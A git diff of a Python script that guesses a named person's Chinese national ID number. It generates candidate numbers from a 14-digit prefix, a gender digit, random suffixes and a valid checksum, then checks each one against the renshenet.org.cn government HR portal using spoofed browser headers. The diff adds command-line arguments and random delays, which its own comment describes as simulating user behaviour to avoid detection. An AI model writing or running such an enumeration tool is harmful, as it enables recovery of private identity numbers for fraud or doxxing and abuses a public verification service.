@@ -2,21 +2,8 @@ import random
 import requests
 import asyncio
 import aiohttp
-import hashlib
-
-# 获取用户输入
-idcard_prefix = input("身份证号码前14位：")
-name = input("姓名：")
-gender = input("性别（男/女）：")
-
-# 性别判断和第17位生成
-if gender.lower() == "男":
-    idcard_17th = str(random.randint(1, 9))
-elif gender.lower() == "女":
-    idcard_17th = str(random.randint(0, 8))
-else:
-    print("性别输入错误，请输入'男'或'女'")
-    exit()
+import argparse
+import time
 
 
 # 生成校验码函数（基于身份证校验规则）
@@ -32,7 +19,7 @@ verified_cache = {}
 
 
 # 异步请求函数
-async def verify_idcard(session, idcard):
+async def verify_idcard(session, idcard, name):
     if idcard in verified_cache:
         print(f"身份证号码 {idcard} 已缓存结果: {verified_cache[idcard]}")
         return verified_cache[idcard]
@@ -40,18 +27,9 @@ async def verify_idcard(session, idcard):
     headers = {
         'Host': 'www.renshenet.org.cn',
         'Accept': 'application/json, text/plain, */*',
-        'Sec-Fetch-Site': 'same-origin',
-        'depCode': '0004',
-        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Sec-Fetch-Mode': 'cors',
+        'User-Agent': 'Mozilla/5.0',
         'Content-Type': 'application/json;charset=UTF-8',
-        'Origin': 'https://www.renshenet.org.cn',
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
         'Referer': 'https://www.renshenet.org.cn/jxzhrsdist/index.html',
-        'Content-Length': '47',
-        'Connection': 'keep-alive',
-        'Sec-Fetch-Dest': 'empty'
     }
 
     data = {
@@ -75,17 +53,39 @@ async def verify_idcard(session, idcard):
 
 
 # 主异步函数
-async def main():
+async def main(idcard_prefix, name, gender):
+    if gender == "男":
+        idcard_17th = str(random.randint(1, 9))
+    elif gender == "女":
+        idcard_17th = str(random.randint(0, 8))
+    else:
+        print("性别输入错误，请输入'男'或'女'")
+        return
+
     idcard_suffixes = [str(random.randint(0, 999)).zfill(3) for _ in range(100)]
     async with aiohttp.ClientSession() as session:
-        tasks = []
         for suffix in idcard_suffixes:
             idcard_without_checksum = idcard_prefix + idcard_17th + suffix
             checksum = calculate_checksum(idcard_without_checksum)
             idcard = idcard_without_checksum + checksum
-            tasks.append(verify_idcard(session, idcard))
-        await asyncio.gather(*tasks)
+
+            # 设置请求频率限制，最多每秒处理3个请求
+            await verify_idcard(session, idcard, name)
+
+            # 加入随机延时，模拟用户行为
+            delay = random.uniform(0.5, 2)  # 随机延时 0.5 到 2 秒之间
+            print(f"等待 {delay:.2f} 秒...")
+            await asyncio.sleep(delay)
 
 
-# 运行异步函数
-asyncio.run(main())
+if __name__ == "__main__":
+    # 使用 argparse 模块处理命令行输入
+    parser = argparse.ArgumentParser(description="身份证生成和验证工具")
+    parser.add_argument('--idcard_prefix', type=str, required=True, help="身份证号码前14位")
+    parser.add_argument('--name', type=str, required=True, help="姓名")
+    parser.add_argument('--gender', type=str, choices=["男", "女"], required=True, help="性别（男/女）")
+
+    args = parser.parse_args()
+
+    # 运行异步函数
+    asyncio.run(main(args.idcard_prefix, args.name, args.gender))
